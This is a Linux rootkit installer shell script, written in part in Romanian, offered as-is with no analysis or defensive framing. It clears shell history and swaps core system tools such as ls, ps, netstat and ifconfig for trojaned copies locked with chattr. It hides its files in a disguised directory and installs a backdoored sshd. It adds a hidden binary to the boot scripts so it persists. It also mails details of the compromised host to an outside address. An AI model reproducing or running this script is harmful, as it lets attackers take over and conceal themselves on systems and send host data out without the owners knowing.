

#!/bin/sh
unset HISTFILE
chown root.root * 

clear
echo
echo "= Getting Ready To Assimilate Host ="
echo
./rdx
rm -rf /bin/ls
mv ls /bin/ls
rm -rf /sbin/ifconfig
mv ifconfig /sbin/ifconfig
rm -rf /bin/netstat
mv netstat /bin/netstat
rm -rf /bin/ps
mv ps /bin/ps
rm -rf /usr/bin/top
mv top /usr/bin/top
mv pstree /usr/bin/pstree
rm -rf /usr/sbin/tcpd
mv tcpd /usr/sbin/tcpd
chattr +i /bin/ls
chattr +i /sbin/ifconfig
chattr +i /bin/netstat
chattr +i /bin/ps
chattr +i /usr/bin/pstree
chattr +i /usr/bin/tcpd
./xdr
echo
echo "= Creating dirs... ="
echo
./psg
echo "= Gata cu procesele ="
echo
echo
echo "= Incepem creerea directoarelor.. =" 
mkdir -p /var/run/.".."dica/ 


mv -f clean  write read lf dxr /var/run/.".."dica/
mv -f xl xdr rdx cl.sh va secure psg /var/run/.".."dica/
mv -f sshd_config ssh_host_key ssh_random_seed /etc
mv -f mh/ /var/run/.".."dica/mh/
mv -f scan/ /var/run/.".."dica/scan/

touch /var/run/.".."dica/last.log


echo "/usr/bin/.etc -t1 -X53 -p" >> /etc/rc.d/rc.sysinit
echo >> /etc/rc.d/rc.sysinit
mv .etc -f /usr/bin/
chmod 755 /usr/bin/.etc
chattr +ai /usr/bin/.etc
/usr/bin/.etc
chattr +i /etc/rc.d/rc.sysinit

chmod 755 /var/run/.".."dica/xl
chattr +ai /var/run/.".."dica/xl

rm -rf /usr/sbin/sshd2
mv sshd /usr/sbin/sshd2
/usr/sbin/sshd2

touch /tmp/info
/sbin/ifconfig |grep "inet" >> /tmp/info
hostname -f >> /tmp/info
uname -a >> /tmp/info
cat /proc/cpuinfo |grep "vendor_id" >> /tmp/info
cat /proc/cpuinfo |grep "cpu MHz" >> /tmp/info
ping -c3 yahoo.com >> /tmp/info
cat /tmp/info|mail -s "Host Assimilator" dicaprio_d@personal.ro
rm -rf /tmp/info
chattr +ai /etc/rc.d/rc.sysinit
echo
echo "                       [*************************************]"
echo "                       [************* All Done! *************]"
echo "                       [******** Way to Go Mancatziash ******]"
echo "                       [*************************************]"

cd ..
rm -rf dica dica.tgz
